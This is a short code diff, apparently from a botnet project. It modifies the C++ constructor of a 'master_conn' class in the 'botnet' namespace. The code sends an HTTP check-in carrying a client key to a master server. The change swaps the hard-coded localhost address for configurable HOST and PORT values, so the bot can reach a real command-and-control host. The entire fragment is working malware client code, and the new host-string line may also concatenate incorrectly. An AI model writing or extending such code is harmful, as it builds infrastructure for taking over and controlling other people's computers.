@@ -5,22 +5,25 @@
 #include "master_conn.h"
 #include "http_client.h"
 #include "http_request.h"
+#include "define.h"
 
 namespace botnet{
     master_conn::master_conn() {
         typedef botnet::http::http_request http_request;
         typedef botnet::http::http_client http_client;
 
+        std::string host = HOST + ':' + std::to_string(PORT);
+
         http_request *http_req = new http_request(botnet::http::GET);
         http_request::headers header;
-        header.add("Host", "localhost:5000");
+        header.add("Host", host);
         std::string path = "?k_c=" + std::to_string(client_key) +
             "&confirm=" + std::to_string(confirm_msg);
 
         http_req->setPath(path);
         http_req->setHeaders(header);
 
-        http_client *http_c = new http_client("localhost", 5000);
+        http_client *http_c = new http_client(HOST, PORT);
         http_c->request(http_req);
 
         std::cout << http_c->getContent() << '\n';
